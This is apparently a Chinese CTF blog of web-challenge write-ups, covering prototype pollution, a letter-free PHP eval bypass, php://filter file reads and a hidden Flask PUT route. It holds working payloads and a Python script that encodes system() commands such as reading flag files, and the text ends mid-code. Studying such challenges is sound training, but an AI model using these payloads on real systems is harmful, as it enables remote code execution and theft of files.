js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs js">    <span class="hljs-comment">// 普通对象</span><br>    <span class="hljs-keyword">const</span> obj1 = &#123;&#125;;<br>    <span class="hljs-keyword">const</span> obj2 = &#123;&#125;;<br>    <br>    <span class="hljs-comment">// 污染 Object.prototype（所有对象的“爷爷”）</span><br>    obj1.<span class="hljs-property">__proto__</span>.<span class="hljs-property">__proto__</span>.<span class="hljs-property">hacked</span> = <span class="hljs-string">&quot;被污染了！&quot;</span>;<br>    <br>    <span class="hljs-comment">// 所有对象都会继承这个属性！</span><br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(obj2.<span class="hljs-property">hacked</span>); <span class="hljs-comment">// 输出 &quot;被污染了！&quot;</span><br><br>*   <span class="hljs-string">`Object.prototype`</span> 是几乎所有对象的“爷爷”。<br>    <br>*   修改它后，所有对象（如 <span class="hljs-string">`obj2`</span>）都会自动继承 <span class="hljs-string">`hacked`</span> 属性。<br>    <br></code></pre></td></tr></table></figure><hr><h3 id="5-回到CTF题目中的攻击"><a href="#5-回到CTF题目中的攻击" class="headerlink" title="5. 回到CTF题目中的攻击"></a><strong>5. 回到CTF题目中的攻击</strong></h3><p>题目中的请求数据：</p><pre><code class="hljs">&#123;  &quot;point&quot;: &#123;    &quot;amount&quot;: 0,    &quot;__proto__&quot;: &#123; &quot;amount&quot;: 10000 &#125;  &#125;&#125;</code></pre><h4 id="攻击步骤："><a href="#攻击步骤：" class="headerlink" title="攻击步骤："></a><strong>攻击步骤：</strong></h4><ol><li><p><strong>设置 <code>amount: 0</code></strong>：触发后端代码 <code>delete req.body.point.amount</code>，删除对象自身的 <code>amount</code>。</p></li><li><p><strong>通过 <code>__proto__</code> 修改原型</strong>：将 <code>point</code> 对象的“爸爸”设置为一个包含 <code>amount: 10000</code> 的对象。</p></li><li><p><strong>继承伪造的 <code>amount</code></strong>：当后端检查 <code>point.amount</code> 时，由于自身属性被删除，会从“爸爸”那里继承 <code>amount: 10000</code>，从而绕过限制。</p></li></ol><hr><h3 id="6-类比理解"><a href="#6-类比理解" class="headerlink" title="6. 类比理解"></a><strong>6. 类比理解</strong></h3><p>想象你有一个家族：</p><ul><li><p><strong>你自己</strong>：有一个钱包（属性），但你把钱包扔了（<code>delete</code>）。</p></li><li><p><strong>你的爸爸</strong>：你偷偷修改了爸爸的钱包，往里塞了10000元（通过 <code>__proto__</code> 修改原型）。</p></li><li><p><strong>别人检查你的财产</strong>：发现你没钱包，于是看你爸爸的钱包，认为你有10000元！</p></li></ul><hr><h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a><strong>总结</strong></h3><ul><li><p><code>__proto__</code> 是对象访问“爸爸”（原型）的入口。</p></li><li><p><strong>原型链污染</strong>就是通过修改“爸爸”的属性，影响所有“儿子”对象。</p></li><li><p>在CTF中，攻击者利用这一点伪造数据，绕过逻辑检查。</p></li></ul><p>这样解释清楚了吗？如果还有疑问，可以随时问我！ 😊</p><hr><h2 id="title-note-36date-2025-05-24-23-36-51tags-web"><a href="#title-note-36date-2025-05-24-23-36-51tags-web" class="headerlink" title="title: note-36date: 2025-05-24 23:36:51tags: web"></a>title: note-36<br>date: 2025-05-24 23:36:51<br>tags: web</h2><h1 id="SWPUCTF-2021-新生赛-hardrce"><a href="#SWPUCTF-2021-新生赛-hardrce" class="headerlink" title="[SWPUCTF 2021 新生赛]hardrce"></a>[SWPUCTF 2021 新生赛]hardrce</h1><p>开局给源码，只看一眼  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;wllm&#x27;</span>]))<br>&#123;<br>    <span class="hljs-variable">$wllm</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;wllm&#x27;</span>];<br>    <span class="hljs-variable">$blacklist</span> = [<span class="hljs-string">&#x27; &#x27;</span>,<span class="hljs-string">&#x27;\t&#x27;</span>,<span class="hljs-string">&#x27;\r&#x27;</span>,<span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;\+&#x27;</span>,<span class="hljs-string">&#x27;\[&#x27;</span>,<span class="hljs-string">&#x27;\^&#x27;</span>,<span class="hljs-string">&#x27;\]&#x27;</span>,<span class="hljs-string">&#x27;\&quot;&#x27;</span>,<span class="hljs-string">&#x27;\-&#x27;</span>,<span class="hljs-string">&#x27;\$&#x27;</span>,<span class="hljs-string">&#x27;\*&#x27;</span>,<span class="hljs-string">&#x27;\?&#x27;</span>,<span class="hljs-string">&#x27;\&lt;&#x27;</span>,<span class="hljs-string">&#x27;\&gt;&#x27;</span>,<span class="hljs-string">&#x27;\=&#x27;</span>,<span class="hljs-string">&#x27;\`&#x27;</span>,];<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$blacklist</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$blackitem</span>)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$blackitem</span> . <span class="hljs-string">&#x27;/m&#x27;</span>, <span class="hljs-variable">$wllm</span>)) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;LTLT说不能用这些奇奇怪怪的符号哦！&quot;</span>);<br>    &#125;&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[a-zA-Z]/is&#x27;</span>,<span class="hljs-variable">$wllm</span>))<br>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Ra&#x27;s Al Ghul说不能用字母哦！&quot;</span>);<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;NoVic4说：不错哦小伙子，可你能拿到flag吗？&quot;</span>;<br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$wllm</span>);<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;蔡总说：注意审题！！！&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span> 蔡总说：注意审题！！！<br></code></pre></td></tr></table></figure><p>这都过滤了啥，给deepseek看看<br>d导思考了很久，给了几个payload，都无法起效  </p><p>上网一找，看来这种应该叫做无字母rec，如名字，就是无法传入字母字符啥的<br><a href="https://www.cnblogs.com/pursue-security/p/15404150.html">https://www.cnblogs.com/pursue-security/p/15404150.html</a>  </p><p>故叫d导帮写了个脚本来构造payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_neg_payload</span>(<span class="hljs-params">s</span>):<br>    payload = []<br>    <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> s:<br>        neg = (~<span class="hljs-built_in">ord</span>(c)) &amp; <span class="hljs-number">0xFF</span>  <span class="hljs-comment"># 取反并转换为无符号字节</span><br>        payload.append(<span class="hljs-string">f&quot;%<span class="hljs-subst">&#123;neg:02X&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(payload)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">parse_command</span>(<span class="hljs-params">cmd</span>):<br>    <span class="hljs-comment"># 匹配 function(&#x27;argument&#x27;) 格式</span><br>    pattern = <span class="hljs-string">r&#x27;^\s*?(\w+?)\s*?\(\s*?[\&#x27;&quot;](.*?)[\&#x27;&quot;]\s*?\)\s*?;?&#x27;</span><br>    <span class="hljs-keyword">match</span> = re.<span class="hljs-keyword">match</span>(pattern, cmd)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">match</span>:<br>        <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">&quot;命令格式错误！请使用 function(&#x27;argument&#x27;) 格式&quot;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>), <span class="hljs-keyword">match</span>.group(<span class="hljs-number">2</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    cmd = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入PHP命令（示例：system(&#x27;ls /&#x27;)：&quot;</span>).strip()<br>    <span class="hljs-keyword">try</span>:<br>        func, arg = parse_command(cmd)<br>        <br>        <span class="hljs-comment"># 生成函数名和参数的取反payload</span><br>        func_neg = generate_neg_payload(func)<br>        arg_neg = generate_neg_payload(arg)<br>        <br>        payload = <span class="hljs-string">f&quot;(~<span class="hljs-subst">&#123;func_neg&#125;</span>)(~<span class="hljs-subst">&#123;arg_neg&#125;</span>);&quot;</span><br>        <br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n生成的取反Payload：&quot;</span>)<br>        <span class="hljs-built_in">print</span>(payload)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n使用说明：&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;1. 需要目标环境开启短标签支持&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;2. 确保PHP版本支持这种调用方式&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;3. 实际使用时可能需要URL编码整个payload&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;4. 示例最终形式：?code=~%8C%86%8C%8B%9A%92~%93%8C%DF%D0&quot;</span>)<br>        <br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;错误：<span class="hljs-subst">&#123;<span class="hljs-built_in">str</span>(e)&#125;</span>&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p>示例：</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs mel"><span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);<br>生成的取反Payload：<br>(~%8C%86%8C%8B%9A%92)(~%93%8C);<br><br><span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;ls /&#x27;</span>);<br>生成的取反Payload：<br>(~%8C%86%8C%8B%9A%92)(~%93%8C%DF%D0);<br><br><span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;cat /flllllaaaaaaggggggg&#x27;</span>); <br>生成的取反Payload：<br>(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%D0%99%93%93%93%93%93%9E%9E%9E%9E%9E%9E%98%98%98%98%98%98%98);<br></code></pre></td></tr></table></figure><h1 id="SWPUCTF-2022-新生赛-ez-ez-php"><a href="#SWPUCTF-2022-新生赛-ez-ez-php" class="headerlink" title="[SWPUCTF 2022 新生赛]ez_ez_php"></a>[SWPUCTF 2022 新生赛]ez_ez_php</h1><p>开题给源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> ( <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>], <span class="hljs-number">0</span>, <span class="hljs-number">3</span>) === <span class="hljs-string">&quot;php&quot;</span> ) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Nice!!!&quot;</span>;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>]);<br>    &#125; <br><br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hacker!!&quot;</span>;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-comment">//flag.php</span><br></code></pre></td></tr></table></figure><p>源码大概意思是有个substr函数截取file传入参数前3位，所以前3位得是’php’，这直接就是提示伪协议了啊</p><p>?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</p><figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ceylon">NSSCTF&#123;flag<span class="hljs-number">_</span><span class="hljs-keyword">is</span><span class="hljs-number">_n</span>ot<span class="hljs-number">_</span>here&#125;<br>real<span class="hljs-number">_f</span>lag<span class="hljs-number">_</span><span class="hljs-keyword">is</span><span class="hljs-number">_</span><span class="hljs-keyword">in</span><span class="hljs-number">_</span><span class="hljs-string">&#x27;flag&#x27;</span><br>换个思路，试试PHP伪协议呢<br></code></pre></td></tr></table></figure><p>?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag<br>拿到正确flag，但是啊但是</p><p>尽然直接访问&#x2F;flag 就能拿</p><h1 id="GDOUCTF-2023-EZ-WEB"><a href="#GDOUCTF-2023-EZ-WEB" class="headerlink" title="[GDOUCTF 2023]EZ WEB"></a>[GDOUCTF 2023]EZ WEB</h1><p>打开题目是一个假按钮，扫了一下发现&#x2F;src有如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-keyword">import</span> flask<br><br>app = flask.Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>) </span><span class="hljs-comment">## GET 方式访问 / 就返回index.html</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>  <span class="hljs-keyword">return</span> flask.send_file(<span class="hljs-string">&#x27;index.html&#x27;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/src&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">source</span>():<br>  <span class="hljs-keyword">return</span> flask.send_file(<span class="hljs-string">&#x27;app.py&#x27;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/super-secret-route-nobody-will-guess&#x27;</span>, methods=[<span class="hljs-string">&#x27;PUT&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">flag</span>():<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag&#x27;</span>).read()<br></code></pre></td></tr></table></figure><p>老规矩，先问d导  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -X PUT http://node5.anna.nssctf.cn:28256/super-secret-route-nobody-will-guess<br></code></pre></td></tr></table></figure><p>直接返回flag，行，看看源码<br>好像是规定了几个条件  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">## GET 方式访问 / 就返回index.html</span><br><span class="hljs-comment">## GET 方式访问 /src 就返回 app.py</span><br><span class="hljs-comment">## PUT 方式访问 /super-secret-route-nobody-will-guess 就打开flag，然后read它</span><br></code></pre></td></tr></table></figure><p>那我猜这可能是一个python后端？<br>以前也没见过，那现在知道了</p><hr><h2 id="title-note-37date-2025-06-02-03-27-46tags"><a href="#title-note-37date-2025-06-02-03-27-46tags" class="headerlink" title="title: note-37date: 2025-06-02 03:27:46tags:"></a>title: note-37<br>date: 2025-06-02 03:27:46<br>tags:</h2><h1 id="Mini-L-CTF-miniup"><a href="#Mini-L-CTF-miniup" class="headerlink" title="Mini L-CTF miniup"></a>Mini L-CTF miniup</h1><p>在查看图片处直接查看index.php能得到源码  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$dufs_host</span> = <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>;<br><span class="hljs-variable">$dufs_port</span> = <span class="hljs-string">&#x27;5000&#x27;</span>;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="hljs-string">&#x27;POST&#x27;</span> &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;action&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;action&#x27;</span>] === <span class="hljs-string">&#x27;upload&#x27;</span>) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br>        <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>        <br>        <span class="hljs-variable">$filename</span> = <span 